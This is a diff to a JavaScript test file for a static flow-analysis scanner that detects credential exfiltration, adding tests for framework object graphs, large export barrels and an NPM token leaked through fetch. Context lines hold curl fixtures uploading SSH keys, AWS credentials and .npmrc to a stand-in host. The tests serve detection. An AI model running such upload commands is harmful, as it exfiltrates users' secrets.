@@ -222,6 +222,28 @@ test('cycles, missing modules and resource limits cannot silently clear flow ana
   assert.ok(hints("const x=require('./missing'); fetch('/api',{body:x})").some(h => h.kind === 'flow-analysis-gap'));
   assert.ok(hints('/*' + 'x'.repeat(1024 * 1024)).some(h => h.kind === 'flow-analysis-gap'));
 });
+test('framework object graphs stay bounded while unknown calls preserve taint bits', () => {
+  const framework = createFlowAnalysis([{ path: 'index.js', content: `
+    const app={request:{},response:{},settings:{}};
+    module.exports=function init(req,res,next){
+      setPrototypeOf(req,app.request); setPrototypeOf(res,app.response);
+      req.res=res; res.req=req; res.locals=res.locals||Object.create(null); next();
+    };
+  ` }]).analyze('index.js');
+  assert.equal(framework.status, 'parsed', JSON.stringify(framework.gaps));
+  assert.deepEqual(framework.gaps.filter(g => g.relevant), []);
+
+  const secret = hints("const value=unknown(process.env.NPM_TOKEN,{nested:{x:1}});fetch('/api',{body:value})");
+  assert.ok(secret.some(h => h.kind === 'credential-export'));
+});
+
+test('large generated export barrels aggregate taint without quadratic namespace joins', () => {
+  const declarations = Array.from({ length: 4000 }, (_, index) => `export const icon${index}=${index};`).join('\n');
+  const analysis = createFlowAnalysis([{ path: 'index.js', content: declarations }]).analyze('index.js');
+  assert.equal(analysis.status, 'parsed');
+  assert.equal(analysis.exports.props.size, 4000);
+  assert.equal(analysis.exports.bits, 0);
+});
 test('shell upload detection distinguishes executable curl arguments from quoted documentation and public keys', () => {
   for (const source of ["curl --data-binary @\"$HOME/.ssh/id_ed25519\" https://collector.invalid",
     "curl -T ~/.aws/credentials https://collector.invalid", "curl --data=@~/.npmrc https://collector.invalid"]) {
